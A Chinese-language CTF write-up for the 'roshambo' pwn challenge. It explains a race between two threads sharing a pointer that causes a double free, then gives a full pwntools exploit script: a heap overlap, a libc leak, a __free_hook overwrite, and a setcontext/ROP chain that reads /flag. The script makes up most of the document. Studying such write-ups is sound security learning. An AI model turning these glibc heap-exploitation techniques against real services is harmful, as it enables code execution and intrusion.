# roshambo

## 题目简述

本题是一个自定义 RPC 协议的在线聊天/猜拳服务，需要同时建立 host 和 client 两个连接。程序主线程与子线程通过 pipe、`read`、`write` 交互，并共享部分状态；由于 `sleep` 与阻塞读写造成时序竞争，同一指针可能被替换后分别在两个线程中释放，形成 double free。利用该竞争可反复制造堆重叠/堆溢出，泄露 libc 后劫持 `__free_hook`，再用 `setcontext` 和 ROP 读取 flag。

## 解题过程

这里出题人犯了一个低级错误，导致无限堆溢出，这是我的锅。

首先先说一下，延迟可能会导致exp无法跑通，要多打几次。题目利用强依赖两个连接之间的时序，远程网络抖动会直接影响 double free 是否稳定触发。

这是简单的在线聊天猜拳游戏（并不是）因为协议是自己写的，所以需要抓包逆向一下，抓几个包之后大概就能分析出大概的样子了。

程序中通过管道连接，通过read、write来交互数据。其中的功能有猜拳和聊天功能。主线程输入数据，子线程接受数据并处理。其主要子线程和主线程中有一个变量是公用的，通过sleep导致指针被替换，然后子线程和主线程各自free一次，导致double free。后续通过 `SHOW_RPC_COMMAND`、`GAME_START_RPC_COMMAND`、`GAME_OVER_RPC_COMMAND` 反复触发竞争，把释放后的 chunk 重新布置成可控内容，最终形成 libc leak 和任意写。

预期解是通过sleep导致double free，因为存在read堵塞，所以需要选手自己把控输入的时间，要根据情况去判断是否出现两个read竞争，然后如何解决。其实解决的办法就是再发送一串字符串即可。

这里show功能和游戏结束功能还可能存在竞争导致的堆溢出，不过我没有进一步深入研究了。

```python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import hashlib
import binascii
context.log_level = "DEBUG"
context.arch = "amd64"
if(len(sys.argv) > 1):
    host = remote(sys.argv[1],int(sys.argv[2],10))
    client = remote(sys.argv[1],int(sys.argv[2],10))
else:
    host = process("./roshambo")
    client = process("./roshambo")
elf = ELF("./roshambo")
lib = ELF("./libc-2.27.so")
context.terminal = ['tmux','sp','-h']
hs       = lambda data               :host.send(str(data))
hsa      = lambda delim,data         :host.sendafter(str(delim), str(data))
hsl      = lambda data               :host.sendline(str(data))
hsla     = lambda delim,data         :host.sendlineafter(str(delim), str(data))
hr       = lambda numb=4096          :host.recv(numb)
hru      = lambda delims, drop=True  :host.recvuntil(delims, drop)
hirt     = lambda                    :host.interactive()
cs       = lambda data               :client.send(str(data))
csa      = lambda delim,data         :client.sendafter(str(delim), str(data))
csl      = lambda data               :client.sendline(str(data))
csla     = lambda delim,data         :client.sendlineafter(str(delim), str(data))
cr       = lambda numb=4096          :client.recv(numb)
cru      = lambda delims, drop=True  :client.recvuntil(delims, drop)
cirt     = lambda                    :client.interactive()
command = {
        "EXCHANGE_NAME_SENDER_RPC_COMMAND"  :1,
        "EXCHANGE_NAME_RECEIVER_RPC_COMMAND":2,
        "SHOW_RPC_COMMAND"                  :3,
        "GAME_START_RPC_COMMAND"            :4,
        "ROCK_RPC_COMMAND"                  :5,
        "PAPER_RPC_COMMAND"                 :6,
        "SCISSORS_RPC_COMMAND"              :7,
        "GAME_OVER_RPC_COMMAND"             :8
        }
def RPC(idx,data):
    global command
    hash_data = binascii.a2b_hex(hashlib.sha256(data).hexdigest())
    payload  = '[RPC]'
    payload  = payload.ljust(8,'\x00')
    payload += p64(command[idx])
    payload += p64(len(data))
    payload += hash_data
    payload += data
    return payload
def leave(sh,size,content):
    sh.sendlineafter("size: ",str(size))
    sh.sendafter("what do you want to say?",content)
hsla("Your Mode: ","C")
csla("Your Mode: ","L")
hsla("Authorization: ","NanMengNiuBi")
hru("Your room: ")
room_idx = hru("\n").strip()
csla("Your room: ",room_idx)
hsla(":","xynm")
csla(":","glzjin")
cru("glzjin >>")
hsla("xynm >>",RPC('EXCHANGE_NAME_SENDER_RPC_COMMAND',""))
hsa("xynm >>",RPC('GAME_START_RPC_COMMAND',''))
sleep(1)
hsa("xynm >>",RPC('SHOW_RPC_COMMAND','a' * 0x88))
csla("a" * 0x87,RPC('GAME_OVER_RPC_COMMAND',''))
leave(host  ,0x88,'\x12' * 0x87)
leave(client,0x88,'\x13' * 0x87)
cru("glzjin >>")
sleep(1)
for i in range(7):
    hsa("xynm >>",RPC('GAME_START_RPC_COMMAND',''))
    sleep(1)
    hsa("xynm >>",RPC('SHOW_RPC_COMMAND','a' * 0x78))
    csla("a" * 0x77,RPC('GAME_OVER_RPC_COMMAND',''))
    leave(host  ,0x88,'\x12' * 0x87)
    leave(client,0x88,'\x13' * 0x87)
    cru("glzjin >>")
    sleep(1)
hsa("xynm >>",RPC('GAME_START_RPC_COMMAND',''))
sleep(5)
csla('start!\n',RPC('GAME_OVER_RPC_COMMAND',''))
hsla("xynm >>",p64(0xdeadbeefdeadbeef))
leave(host,0x88,'\x14' * 0x30)
leave(client,0x18,'\x15' * 0x8)
cru('\x15' * 0x8)
libc_base = u64(cr(6).ljust(8,'\x00')) - 88 - 0x18 - lib.sym['__malloc_hook']
lib.address = libc_base
sleep(4)
hsa("xynm >>",RPC('GAME_START_RPC_COMMAND',''))
sleep(1)
payload  = p64(lib.sym['__free_hook'] - 8) * 3
payload += p64(0x51)
payload = payload.ljust(0x88,'\x00')
hsa("xynm >>",RPC('SHOW_RPC_COMMAND',payload))
csla('start!\n',RPC('SHOW_RPC_COMMAND',p64(0xdeadbeefdeadbeef)))
csla('glzjin >>',RPC('GAME_OVER_RPC_COMMAND',''))
payload  = p64(lib.sym['__free_hook'] - 8) * 3
payload += p64(0x51) + p64(lib.sym['__free_hook'] - 8)
payload = payload.ljust(0x88,'\x00')
leave(client,0x88,payload)
sleep(2)
hsla("xynm >>",p64(0xdeadbeefdeadbeef))
leave(host,0x88,'aaaaa\n')
sleep(3)
payload  = p64(lib.sym['__free_hook'] - 8) * 3
payload += p64(0x61)
payload = payload.ljust(0x88,'\x00')
hsa("xynm >>",RPC('SHOW_RPC_COMMAND',payload))
sleep(3)
hsa("xynm >>",RPC('GAME_START_RPC_COMMAND',''))
csla('glzjin >>',RPC('GAME_OVER_RPC_COMMAND',''))
csla("size",str(0x88))
leave(host,0x88,p64(0xdeadbeefdeadbeef))
pop_rdi_ret = 0x000000000002155f
pop_rsi_ret = 0x0000000000023e6a
pop_rdx_ret = 0x0000000000001b96
pop_rdx_rsi_ret = 0x00000000001306d9
pop2_ret = 0x000000000007dd2e
pop4_ret = 0x000000000002219e
ret = 0x00000000000b17c5
payload  = p64(lib.sym['__free_hook'] + 0x18) * (0xA8 / 8)
payload += p64(ret+libc_base)
payload  =  payload.ljust(0x100,'\x00')
hsa("xynm >>",RPC('SHOW_RPC_COMMAND',payload))
sleep(3)
payload  = '/flag'.ljust(8,'\x00')
payload += p64(lib.sym['setcontext'] + (0x520A5 - 0x52070))
payload += p64(0xcafecafecafecafe) * 2
payload += p64(pop_rdi_ret + libc_base) + p64(0x0)
payload += p64(pop_rdx_ret+libc_base) + p64(0x300)
payload += p64(lib.sym['read']) * 9
payload = payload.ljust(0x88,'\x11')
csla("what do you want to say?",payload)
payload = 'a' * 0x30
payload += p64(pop_rdi_ret + libc_base) + p64(lib.sym['__free_hook'] - 8)
payload += p64(pop_rsi_ret + libc_base) + p64(0)
payload += p64(lib.sym['open'])
payload += p64(pop_rdi_ret + libc_base) + p64(5)
payload += p64(pop_rsi_ret + libc_base) + p64(lib.sym['__free_hook'] + 0x100)
payload += p64(pop_rdx_ret + libc_base) + p64(0x200)
payload += p64(lib.sym['read'])
payload += p64(pop_rdi_ret + libc_base) + p64(lib.sym['__free_hook'] + 0x100)
payload += p64(lib.sym['puts'])
sleep(2)
csl(payload)
cirt()

```

## 方法总结

本题不是单纯的堆菜单题，先要逆出自定义 RPC 包格式：固定 `[RPC]` 头、命令号、数据长度、SHA-256 校验和 payload。漏洞触发点在多线程共享指针和阻塞 IO 的时序竞争，利用时要用 host/client 两端配合 `sleep` 控制读写顺序。堆利用部分走 double free 到 chunk 重叠，泄露 `__malloc_hook` 附近地址计算 libc，伪造到 `__free_hook`，再借 `setcontext` 布置寄存器并执行 open/read/puts 读取 `/flag`。
